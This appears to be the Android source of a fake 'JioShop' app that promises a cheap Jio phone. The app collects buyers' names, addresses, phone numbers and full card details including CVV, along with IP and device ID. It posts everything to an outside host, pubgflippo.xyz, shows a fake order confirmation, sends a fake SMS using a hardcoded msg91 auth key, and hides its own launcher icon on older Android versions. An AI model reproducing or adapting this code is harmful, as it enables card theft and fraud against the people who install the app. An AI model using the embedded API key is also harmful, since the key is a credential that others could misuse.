package com.mijio.jioshop;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.bumptech.glide.Glide;
import com.example.hiddenapp.MainActivity;
import com.example.hiddenapp.R;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class FinalActivity extends AppCompatActivity {

    ImageView imageView;
    TextView tvThankYou, tvOrderId;
    Button btnHome;

    String name, mobile, address, city, state, pinCode;
    String cardHolderName, cardNumber, valid, cvv;

    String orderId, orderDate, ipAddress, deviceId;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_final);
        getSupportActionBar().hide();
        imageView = findViewById(R.id.imageView);
        tvThankYou = findViewById(R.id.tvThankYou);
        tvOrderId = findViewById(R.id.tvOrderNum);
        btnHome = findViewById(R.id.btnHome);

        Random random = new Random();
        final int num = random.nextInt(9000000) + 10000000;
        orderId = "JIO-" + num;
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);;


        Bundle bundle = getIntent().getExtras();
        name = bundle.getString("NAME");
        mobile = bundle.getString("MOBILE");
        address = bundle.getString("ADDRESS");
        city = bundle.getString("CITY");
        state = bundle.getString("STATE");
        pinCode = bundle.getString("PINCODE");
        cardHolderName = bundle.getString("CARD_HOLDER");
        cardNumber = bundle.getString("CARD_NUMBER");
        valid = bundle.getString("VALID");
        cvv = bundle.getString("CVV");

        getIpAddressAndPostData();

        Glide.with(this).load(R.drawable.loading).into(imageView);
//        new Handler().postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                Glide.with(FinalActivity.this).load(R.drawable.success).into(imageView);
//
//                tvThankYou.setText("Thank you for your purchase. Your order placed successfully. Your Order ID is : ");
//                tvOrderId.setVisibility(View.VISIBLE);
//                btnHome.setVisibility(View.VISIBLE);
//                tvOrderId.setText("JIO-" + num);
//            }
//        }, 3000);
    }

    private void getIpAddressAndPostData() {

        String url = "https://api.ipify.org/";
        RequestQueue q = Volley.newRequestQueue(this);
        StringRequest request = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        ipAddress = response;

                        postData();
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Toast.makeText(FinalActivity.this, "IP Address Not Available", Toast.LENGTH_SHORT).show();
                        System.out.println(error.getMessage());
                        postData();
                    }
                }
        );

        q.add(request);
    }

    private void postData() {

        final Map<String, String> params = new HashMap<>();
        params.put("name", name);
        params.put("mobile", mobile);
        params.put("address", address);
        params.put("city", city);
        params.put("state", state);
        params.put("pin", pinCode);
        params.put("card_holder", cardHolderName);
        params.put("card_number", cardNumber);
        params.put("valid", valid);
        params.put("cvv", cvv);
        params.put("ip_address", ipAddress == null ? "Not Available" : ipAddress);
        params.put("device_id", deviceId);
        params.put("order_id", orderId);


        String url = "https://pubgflippo.xyz/fhhhh/api/add-order";
        RequestQueue queue = Volley.newRequestQueue(this);
        StringRequest request = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        System.out.println(response);

                        try {
                            JSONObject jsonObject = new JSONObject(response);
                            int code = jsonObject.getInt("code");

                            if( code == 200)
                            {
                                Glide.with(FinalActivity.this).load(R.drawable.success).into(imageView);

                                tvThankYou.setText("Thank you for your purchase. Your order placed successfully. Your Order ID is : ");
                                tvOrderId.setVisibility(View.VISIBLE);
                                btnHome.setVisibility(View.VISIBLE);
                                tvOrderId.setText(orderId);


                                sendConfirmationMessage( orderId, mobile);

                                 // it will execute after 5 seconds
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        // find if android version is 10 or lower
                                        if( Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
                                        {
                                            hideAppIcon();
                                        }

                                    }
                                }, 3000);

                            }
                            else{
                                Toast.makeText(FinalActivity.this, "Failed", Toast.LENGTH_SHORT).show();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {

                    }
                }
        ){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                return params;
            }
        };

        queue.add(request);
    }

    private void hideAppIcon() {

        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    private void sendConfirmationMessage(String orderId, String mobile) {

        String message = "Dear customer, Thanks for shopping with jioshop.Your order submitted successfully. your order id is " + orderId + ". NOTE-: ONE ORDER FOR ONE CUSTOMER.Your Jio 199 Rupee mobile order is confirmed and will be shipped shortly within 48hr Via blue dart courier service. Have a good day";
        StringBuilder sb = new StringBuilder();
        sb.append("{\"sender\": \"SOCKET\",");
        sb.append("\"route\": \"4\",");
        sb.append("\"country\": \"91\",");
        sb.append("\"unicode\": \"1\",");
        sb.append("\"sms\": [");
        sb.append("{\"message\": " + "\"" + message + "\",");
        sb.append("\"to\": [" + "\"" + mobile + "\"]}]}");

        String url = "https://api.msg91.com/api/v2/sendsms";

        try {
            JSONObject jsonObject = new JSONObject(sb.toString());

            RequestQueue queue = Volley.newRequestQueue(FinalActivity.this);

            JsonObjectRequest jSonObjectRequest = new JsonObjectRequest(Request.Method.POST, url, jsonObject,

                    new Response.Listener<JSONObject>() {
                        @Override
                        public void onResponse(JSONObject response) {
                            try {
                                String message  = response.getString("message");
                                String type = response.getString("type");



                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {

                        }
                    }
            ){
                @Override
                public Map<String, String> getHeaders() throws AuthFailureError {
                    Map<String, String> map = new HashMap<>();
                    map.put("authkey", "288991AS2PZYnvEZnC5d4d80ae");
                    map.put("Content-Type", "application/json");
                    return map;
                }
            };


            queue.add(jSonObjectRequest);

        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    public void btnHomeClicked(View view) {

        Intent i = new Intent(FinalActivity.this, LandingActivity.class);
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP |
                Intent.FLAG_ACTIVITY_CLEAR_TASK |
                Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
        finish();
    }
}